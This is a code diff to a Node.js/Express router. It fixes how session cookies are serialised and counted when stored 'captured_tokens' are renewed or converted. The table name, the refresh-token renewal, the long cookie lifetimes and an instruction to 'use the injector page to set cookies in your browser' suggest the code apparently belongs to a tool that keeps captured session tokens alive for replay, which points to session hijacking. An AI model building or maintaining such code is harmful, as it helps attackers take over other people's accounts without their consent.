@@ -886,7 +886,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
                  access_token_encrypted = ?, refresh_token_encrypted = ?
              WHERE id = ?`,
             [
-              encrypt(result.cookies),
+              encrypt(JSON.stringify(result.cookies)),
               ttlHours,
               encrypt(newAccessToken),
               encrypt(newRefreshToken),
@@ -900,7 +900,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
           );
 
         // FIX: Use local cookie_count variable instead of undefined result.cookie_count
-        const cookieCount = result.cookies ? (result.cookies.split(';').filter(c => c.trim()).length) : 0;
+        const cookieCount = result.cookies ? (Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(c => c.trim()).length) : 0;
         return res.json({
           success: true,
           message: 'Session renewed successfully using refresh token',
@@ -925,10 +925,10 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
         await db.query(
           'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
-          [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
+          [encrypt(JSON.stringify(cookieResult.cookies)), 'cookie', ttlHours, token.id]
         );
         // FIX: Use local cookie_count variable instead of undefined result.cookie_count
-        const cookieCount = cookieResult.cookies ? (cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
+        const cookieCount = cookieResult.cookies ? (Array.isArray(cookieResult.cookies) ? cookieResult.cookies.length : cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
         return res.json({
           success: true,
           message: 'Session renewed successfully',
@@ -1145,7 +1145,7 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
       res.json({
         success: true,
         cookies: result.cookies,
-        cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
+        cookie_count: Array.isArray(result.cookies) ? result.cookies.length : result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
         expires: '30 days',
         instructions: 'Use the injector page to set cookies in your browser'
       });
